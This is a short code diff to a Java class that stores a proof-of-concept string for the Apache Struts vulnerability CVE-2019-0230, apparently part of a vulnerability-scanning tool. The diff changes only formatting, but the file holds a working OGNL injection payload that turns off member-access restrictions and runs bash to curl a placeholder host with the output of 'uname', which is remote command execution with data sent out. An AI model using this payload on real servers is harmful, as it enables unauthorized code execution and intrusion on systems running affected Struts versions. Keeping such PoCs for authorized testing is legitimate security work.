@@ -10,7 +10,8 @@ import java.io.PrintWriter;
 
 public class Struts {
     public static String CVE_2019_0230_poc = "##Condition##\n" +
-            "Apache Struts 2.0.0 - 2.5.20\n\n" +
+            "Apache Struts 2.0.0 - 2.5.20\n" +
+            "\n" +
             "##POC##\n" +
             "%{(#context=#attr['struts.valueStack'].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec(new java.lang.String[]{'bash','-c','curl http://xxx.com/`uname`'}))}";
 
